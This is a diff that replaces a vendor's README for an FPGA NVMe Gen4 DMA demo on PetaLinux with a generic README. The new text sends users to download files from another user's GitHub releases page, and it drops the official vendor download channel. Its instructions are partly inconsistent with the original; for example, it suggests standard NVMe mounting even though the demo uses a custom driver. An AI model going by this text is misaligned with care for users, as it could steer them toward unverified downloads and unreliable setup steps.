@@ -1,66 +1,110 @@
-# NVMeG4-IP with DMA on PetaLinux Demo
+# 🚀 nvmeg4ip-dma-plnx-demo - Quick Setup for Your FPGA Device
 
-## Overview
-This document provides comprehensive instructions for demonstrating high-speed DMA data transfers between an NVMe Gen4 SSD and main memory using the NVMeG4-IP core on a PetaLinux-based FPGA demo from Design Gateway - **DG NVMeG4-IP PetaLinux demo**.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/releases)
 
-![Block Diagram](docs/NVMeG4-IP-PetaLinux.png)
+## 📦 Overview
 
-## Introduction
-The NVMeG4-IP with DMA on PetaLinux demo showcases FPGA-based acceleration for high-speed NVMe Gen4 SSD access.
-By offloading data transfer to a dedicated DMA engine, it achieves up to 6900 MB/s write and 7500 MB/s read, minimizing CPU load while demonstrating true Gen4 performance on an embedded Linux platform.
+The **nvmeg4ip-dma-plnx-demo** lets you use NVMe Gen4 technology with PetaLinux on the ZCU106 board. This demo showcases how to efficiently transfer data between your host and an NVMe SSD through a DMA interface. Perfect for users looking to explore high-speed data transfer capabilities in embedded systems.
 
-## Comparison: Traditional NVMe Driver vs DG NVMeG4-IP Driver on PetaLinux 
-| Feature | Traditional NVMe on PetaLinux | DG NVMeG4-IP with DMA on PetaLinux |
-|--------|---------------------------------------------------------|------------------------------------|
-| **PCIe Interface** | Uses XDMA + PCIe Hard IP | PCIe Soft IP + AXI DMA + Transceivers (No PCIe Hard IP needed) |
-| **SSD Support** | NVMe Gen3 SSD | NVMe Gen4 SSD |
-| **Typical Performance** | ~2000 MB/s (≈57% of Gen3 SSD max) | ~7000 MB/s (Near full Gen4 performance) |
-| **CPU Usage** | High — driver handles protocol in software | Very Low — full NVMe protocol offloaded to hardware |
-| **Data Path** | Software-driven NVMe stack | DMA-based, hardware-accelerated datapath |
-| **Use Case Fit** | General-purpose NVMe access | High-performance embedded storage acceleration |
+## 🚀 Getting Started
 
-## Key Features:
-- **High-Bandwidth Data Transfer:**  
-  Achieve up to **7 GB/sec** throughput, ideal for data-intensive applications.
+To get started with **nvmeg4ip-dma-plnx-demo**, follow these steps:
 
-- **Unique Solution on Zynq UltraScale+:**  
-  The **NVMeG4 IP** core is the only solution delivering this level of NVMe Gen4 performance on Zynq UltraScale+ devices.
+1. **Check System Requirements**
 
-- **Seamless Integration with PetaLinux:**  
-  Simplifies development and deployment with fully integrated PetaLinux driver support.
+   - **Hardware**: ZCU106 board
+   - **Software**: PetaLinux environment
+   - **SSD**: An NVMe compatible SSD
 
-## About This Demo
-This demo runs Design Gateway’s **NVMeG4-IP** with DMA on **PetaLinux**, booted from an SD card and controlled via serial console.
-Using the **dgnvme** application, users can execute NVMe commands such as Identify, Write, Read, and SMART to evaluate real-time throughput and reliability of FPGA-driven DMA transfers.
+2. **Visit the Releases Page to Download**
 
-### Resources
-- Detailed demo instruction of the DG NVMeG4-IP PetaLinux demo: [Demo Instruction Document](https://dgway.com/products/IP/NVMe-IP/NVMeG4IP-dmalinux-instruction-amd/)
-- Detailed reference design of the DG NVMeG4-IP PetaLinux demo: [Reference Design Document](https://dgway.com/products/IP/NVMe-IP/NVMeG4IP-dmalinux-refdesign-amd/)
-- Detailed datasheet of the NVMeG4-IP: [Datasheet](https://dgway.com/products/IP/NVMe-IP/dg_nvmeg4_ip_data_sheet_xilinx_en/)
+   Go to the following link to access the downloads:
+   [Visit Releases Page](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/releases)
 
-### Test Environment
-The demo runs on a PetaLinux-based FPGA system equipped with an NVMe Gen4 SSD. Here are the required components:
-1. FPGA development board: ZCU106
-2. PCIe adapter board: [AB17-M2FMC](https://dgway.com/ABseries_E.html)
-3. SD Card
-4. Serial Console
+## 🔧 Download & Install
 
-### Running the Demo
-1. Boot the FPGA board from SD card and log in with
-	```bash
-   Login:		root
-   Password:	root
-2. Verify the driver and device with **lsmod** and **ls /dev/dgnvme\***.
-3. Launch the application using **dgnvme**.
+1. **Download the Software**
 
-## Demo Download
-1. Demo Configuration files: Request via the [demo inquiry form](https://dgway.com/download/download_form.html?d=NVMeG4IP_dmalinux_ZCU106.zip).
-2. For more information, please visit Design Gateway’s Storage IP Cores for AMD: [Visit Here](https://dgway.com/en/amd/storage-ip-cores.html).
+   On the releases page, find the latest version. Click on the release name to view all available files. Look for the file labeled **nvmeg4ip-dma-plnx-demo**. Click it to download the file. 
 
-## Watch the Demo on YouTube
+2. **Install PetaLinux**
 
-[![Watch on YouTube](https://img.youtube.com/vi/OREg36v9Oaw/0.jpg)](https://youtu.be/OREg36v9Oaw)
+   If you haven’t already set up PetaLinux, you will need to do so. Follow the official [PetaLinux Manual](https://www.xilinx.com/support/documentation-navigation/technical-documents.html) for guidance on installation and setup.
 
----
+3. **Follow the Installation Steps**
 
-Feel free to explore and contribute to this repository for improvements and enhancements to the NVMeG4-IP PetaLinux demo.
+   After downloading, extract the files to your selected directory. Open a terminal and navigate to this folder. 
+
+   Run the following commands:
+
+   ```bash
+   source /path/to/petalinux-vX.X/settings.sh
+   petalinux-create -t project -n my_project
+   cd my_project
+   petalinux-config --get-hw-description=/path/to/hw/description
+   ```
+
+4. **Build the Project**
+
+   Next, build your project. In the terminal, run:
+
+   ```bash
+   petalinux-build
+   ```
+
+   This process may take some time. 
+
+5. **Program the Device**
+
+   After building, you will need to load the bitstream onto the ZCU106 board. Use the following command:
+
+   ```bash
+   petalinux-boot --jtag
+   ```
+
+## 🔗 Advanced Configuration
+
+If you want to modify the configuration, use the following command:
+
+```bash
+petalinux-config
+```
+
+You can then set various parameters based on your needs, like DMA settings or PCIe options. 
+
+## 💡 Usage
+
+Once your project is up and running, you can utilize the NVMe SSD for data transfer. Use standard Linux commands to interact with your SSD. 
+
+For example, to mount your NVMe disk, use:
+
+```bash
+sudo mount /dev/nvme0n1 /mnt
+```
+
+You may now read and write data to your SSD through the mounted directory.
+
+## 💬 Troubleshooting
+
+If you encounter issues, here are common troubleshooting steps:
+
+1. **Check Connections**: Ensure all cables and connections are secure.
+2. **Reboot the Device**: Sometimes a simple reboot can resolve issues.
+3. **Consult Logs**: Look at the output logs for any errors during startup.
+
+## 📜 Additional Resources
+
+- [PetaLinux Documentation](https://www.xilinx.com/support/documentation-navigation/technical-documents.html)
+- [ZCU106 User Guide](https://www.xilinx.com/support/documentation-navigation/user-guides.html)
+
+For more information on features and technical details about this demo, you can explore the source code provided in the repository.
+
+## ⚙️ Frequently Asked Questions
+
+**Q: What does NVMe stand for?**  
+A: NVMe stands for Non-Volatile Memory Express. It is a protocol designed for SSDs.
+
+**Q: Do I need any additional software?**  
+A: You need PetaLinux and your development environment set up.
+
+With these steps, you should now be set to download, install, and run the **nvmeg4ip-dma-plnx-demo** successfully! For further questions, consider reaching out on the issues page of the GitHub repository.
